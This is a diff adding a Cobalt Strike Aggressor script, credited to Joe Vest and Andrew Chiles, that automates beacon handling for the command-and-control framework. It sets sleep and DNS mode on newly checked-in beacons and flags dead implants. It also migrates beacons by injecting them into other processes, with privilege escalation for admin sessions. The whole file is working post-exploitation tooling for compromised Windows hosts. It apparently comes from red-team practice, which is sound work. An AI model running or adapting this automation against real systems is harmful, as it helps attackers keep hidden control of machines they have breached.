@@ -1,0 +1,169 @@
+elog("
+###################################################################
+ CobaltStrike Aggressor Script © Joe Vest, Andrew Chiles 2018                                  
+ Author:      Joe Vest, Andrew Chiles
+ Description: Beacon handler with various features
+ Version: CobaltStrike 3.10
+###################################################################");
+
+elog('Loading handler.cna...')
+
+# Need to modify beacon_initial commands to prevent issuing commands against new SMB beacons which will sleep the parent on initial callback
+
+## VARIABLES
+# Track Migrates Beacons in memory array.  Note: Not persistent
+%migratedBeacons = %();
+#%migratedSystems = %();
+
+command showMigratedBeacons {
+    local('$entry $key $value');
+    foreach $entry (%migratedBeacons) {
+        println($entry);
+    }
+}
+
+## Issue initial commands upon new beacon checkin
+on beacon_initial {
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+    bsleep($1, 0);
+    bps($1); # Kicks off AutoMigration as the PS is monitored     
+    bnote($1, "Initial - sleep " . $g_initialSleep . " " . $g_initialJitter);
+    bsleep($1, $g_initialSleep , $g_initialJitter);
+
+}
+
+## Initialize DNS Beacons
+on beacon_initial_empty {
+    binput($1, "mode dns-txt");
+    bmode($1, "dns-txt");
+    binput($1, "checkin");
+    bnote($1, "Initial - sleep " . $g_initialSleep . " " . $g_initialJitter);
+    bcheckin($1);
+    bsleep($1, $g_initialSleep , $g_initialJitter);
+}
+
+## Check last beacon activity and annotate if it passes the dead threshold
+on heartbeat_1m {
+    foreach $beacon (beacons()) {
+
+        # Check if beacon is marked as dead
+        if ("DEAD" !isin $beacon['note']) {
+            # Check if beacon last callback is >= 15 minutes
+            if ($beacon['last'] >= int($g_deadThreshold)) {
+                elog("Beacon Died: " . $beacon['user'] . "@" . $beacon['external'] . " (" . $beacon['computer'] . ") " . $beacon['lastf']);
+                bnote($beacon['id'],"**DEAD** " . formatDate("yyyy.MM.dd_HH:mm:ss z") . "; " . $beacon['note']);
+            }
+        }
+    }
+}
+
+## Issue commands against all beacons every 15 minutes to simulate operator activity
+
+on heartbeat_15m {
+    foreach $beacon (beacons()) {
+        # Check if beacon is marked as DEAD
+        if ("DEAD" !isin $beacon['note']) {
+            #println("Issuing heartbeat commands");
+            #println("Issuing comand ipconfig against " . $beacon['id']);
+            #binput($1,"shell ipconfig");
+            #bshell($beacon['id'],"ipconfig");
+            #bcheckin($1);
+        }
+    }
+}
+
+## Migration - Do each time PS is run
+on beacon_output_ps {
+
+    if ($g_enableMigration) {
+
+        local('$listener');
+        local('$current_listener');
+        if (beacon_info($1, "pbid") eq "") { # Not SMB
+            foreach $listener (listeners_local()) {
+                if (listener_info($listener, "payload") ne "windows/beacon_smb/bind_pipe") {
+                    println($listener);
+                    $current_listener = $listener;
+                }
+            }
+        } else {
+            foreach $listener (listeners_local()) {
+                if (listener_info($listener, "payload") eq "windows/beacon_smb/bind_pipe") {
+                    println($listener);
+                    $current_listener = $listener;
+                }
+            }
+        }
+
+        if ($1 in %migratedBeacons) {
+            println('PS Exectued. Checking migration of ' . $1 . " PID: " . beacon_info($1,"pid") . ": Skipping migration.");
+        } else {
+            println('PS Exectued. Checking migration of ' . $1 . " PID: " . beacon_info($1,"pid") . ": Starting migration.");
+
+            if (isAdmin($1)) {
+
+                $output = $2;
+                @lines = split('\n',$output);
+                foreach $line (@lines) {
+
+                    if ($g_adminMigrationBin isin $line) {
+                        @l = split('\t',$line);
+                        $processName = @l[0]; # Process Name
+                        $parentPID = @l[1];
+                        $adminPID = @l[2]; # PID to migrate to
+                        $arch = @l[3]; # Architecture
+                        $user = @l[4]; # Process user
+                        $session = @l[5]; # Session
+
+                        # Check if running in admin process
+                        if (beacon_info($1,"pid") !eq $adminPID) {
+
+                            # Make sure the current process has access to target process 
+                            if ($session eq "1") {
+
+                                println('Migrating Beacon ' . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_adminMigrationBin . " PID: " . $adminPID);
+                                bgetprivs($1);
+                                binject($1,$adminPID,$current_listener,$arch);
+                                bnote($1,"**MIGRATED** " . formatDate("yyyy.MM.dd_HH:mm:ss z") . "; " . beacon_info($1, 'note'));
+                                bexit($1);
+                            } else {
+                                println('Can not migrate. Can not access process ' . $1 . " PID: " . beacon_info($1,"pid"));
+
+                            }
+
+                        } else {
+                            println('Already Migrated. '  . $1 . " PID: " . beacon_info($1,"pid"));
+                        }
+                    }
+                }
+            } else {
+
+                $output = $2;
+                @lines = split('\n',$output);
+                foreach $line (@lines) {
+
+                    if ($g_userMigrationBin isin $line) {
+                        @l = split('\t',$line);
+                        $processName = @l[0]; # Process Name
+                        $userPID = @l[2]; # PID to migrate to
+                        $arch = @l[3]; # Architecture
+
+                        # Check if running in admin process
+                        if (beacon_info($1,"pid") !eq $userPID) {
+
+                            println('Migrating Beacon ' . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_userMigrationBin . " PID: " . $userPID);
+                            binject($1,$userPID,$current_listener,$arch);
+                            bnote($1,"**MIGRATED** " . formatDate("yyyy.MM.dd 'at' HH:mm:ss z") . "; " . beacon_info($1, 'note'));
+                            bexit($1);
+
+                        } else {
+                            println('Already Migrated. '  . $1 . " PID: " . beacon_info($1,"pid"));
+                        }
+                    }
+                }
+            }
+            # Add to migration list
+            %migratedBeacons[$1] = $1;
+        }
+    }
+}
